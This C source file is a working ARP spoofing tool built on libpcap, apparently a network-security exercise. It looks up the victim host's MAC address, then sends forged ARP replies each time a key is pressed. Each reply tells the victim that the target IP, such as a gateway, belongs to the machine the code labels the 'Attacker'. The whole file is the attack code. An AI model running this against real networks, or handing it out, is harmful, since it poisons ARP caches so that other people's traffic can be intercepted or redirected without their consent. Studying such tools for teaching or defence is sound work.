#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>


#define ETHER_ADDR_LEN	6
#define IP_ADDR_LEN 4
#define ETHERTYPE_IPV4 0x0800
#define ETHERTYPE_ARP 0x0806
#define ETHERNET_SIZE 14
#define E_IP_ARP_SIZE 28

struct ethernet {
		uint8_t ether_dhost[ETHER_ADDR_LEN];
		uint8_t ether_shost[ETHER_ADDR_LEN];
		uint16_t ether_type;
};

struct ethernet_ip_arp {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t operation;
	uint8_t sha[6];
	uint8_t spa[4];
	uint8_t tha[6];
	uint8_t tpa[4];
};


struct sniff_ip {
		uint8_t ip_vhl;
		uint8_t ip_tos;
		uint16_t ip_len;
		uint16_t ip_id;
		uint16_t ip_off;
		uint8_t ip_ttl;
		uint8_t ip_p;
		uint16_t ip_sum;
		struct in_addr ip_src,ip_dst;
};

void usage() {
  printf("syntax: send_arp <interface> <sender_ip> <target_ip>\n");
  printf("sample: pcap_test wlan0 192.168.10.2 192.168.10.1\n");
}

struct in_addr my_ip;
uint8_t my_mac[6], sender_mac[6], my_packet[ETHERNET_SIZE+E_IP_ARP_SIZE];

int get_myinfo()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) {
  	printf("socket open error\n");
	return -1;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { 
	    printf("socket info error\n");
	    return -1;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
		printf("socket get flag error\n");
		return -1;
	}
    }

    if (success){
	    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
	    ioctl(sock, SIOCGIFADDR, &ifr);
	    my_ip =  ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
	    printf("Attacker's : %s\n" ,inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
	    return 0;
    }
    return -1;
}

int send_arpreq(pcap_t * handle,  struct in_addr sender_ip)
{
	struct ethernet * my_ether = (struct ethernet *)my_packet;
        memset(my_ether->ether_dhost, 0xff, ETHER_ADDR_LEN);
        memcpy(my_ether->ether_shost, my_mac, ETHER_ADDR_LEN);

        struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_packet + ETHERNET_SIZE);
        my_arp->operation = htons(1);
        memcpy(my_arp->tpa, &(sender_ip.s_addr), 4);
        memset(my_arp->tha, 0, 6);
        memcpy(my_arp->spa, &(my_ip.s_addr),4);
        memcpy(my_arp->sha, my_mac, 6);

        if(pcap_sendpacket(handle, my_packet, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
        {
                printf("send errror\n");
        	return -1;
        }
	return 0;
}

void init_mypacket()
{
	struct ethernet * my_ether = (struct ethernet *)my_packet;
        my_ether->ether_type = htons(ETHERTYPE_ARP);

        struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_packet + ETHERNET_SIZE);
        my_arp->htype = htons(1);
        my_arp->ptype = htons(0x0800);
        my_arp->hlen = 6;
        my_arp->plen = 4;
	return;
}


int main(int argc, char* argv[])
{
	if (argc != 4)
       	{
		usage();
		return -1;
	}
	
	char* dev = argv[1];
  	struct in_addr sender_ip, target_ip;
  
  	inet_pton(AF_INET, argv[2], &sender_ip);
  	inet_pton(AF_INET, argv[3], &target_ip);
  	if(!get_myinfo())
  	{
		printf("Attacker's Mac : ");
	 	for(int i=0; i<6; i++) printf("%02x:", my_mac[i]);
	  	printf("\n");
  	}
  	init_mypacket();


  	char errbuf[PCAP_ERRBUF_SIZE];
  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
 	 }

 
  	int success = 0;
  	while(true) 
  	{
		struct pcap_pkthdr* header;
    		const uint8_t* packet;
    		send_arpreq(handle, sender_ip);
		int res = pcap_next_ex(handle, &header, &packet);
    		if (res == 0) continue;
    		if (res == -1 || res == -2) break;

                struct ethernet * req_ether = (struct ethernet *)packet;
                if(ntohs(req_ether->ether_type) != ETHERTYPE_ARP) continue;

                struct ethernet_ip_arp * arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);
                if(*(uint *)(arp->spa) != sender_ip.s_addr || ntohs(arp->operation)!=2) continue;

		memcpy(sender_mac, arp->sha, 6);
		success = 1;
		break;
 	 }

  	if(!success){
	  	printf("can't resolve sender's mac\n");
	  	return -1;
  	}
	printf("Sender's Mac : ");
   	for(int i=0; i<6; i++) printf("%02x:", sender_mac[i]);
        printf("\n");
  
 	struct ethernet * my_ether = (struct ethernet *)my_packet;
 	memcpy(my_ether->ether_dhost, sender_mac, ETHER_ADDR_LEN);
 	memcpy(my_ether->ether_shost, my_mac, ETHER_ADDR_LEN);
	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_packet+ETHERNET_SIZE);
  	my_arp->operation = htons(2);
	memcpy(my_arp->tpa, &(sender_ip.s_addr), IP_ADDR_LEN);
	memcpy(my_arp->tha, sender_mac, ETHER_ADDR_LEN);
	memcpy(my_arp->spa, &(target_ip.s_addr), IP_ADDR_LEN);
	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);
  	uint16_t type_chk, operation_chk;
	type_chk = htons((uint16_t)ETHERTYPE_ARP);
	operation_chk = htons((uint16_t)1);
	
	while (true) 
	{
		printf("Send Packet??\n");
		getchar();
    		if(pcap_sendpacket(handle, my_packet, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
		{
				printf("send errror\n");
				break;
		}
		printf("send packet!!!!!\n");
	}
  pcap_close(handle);
  return 0;
}
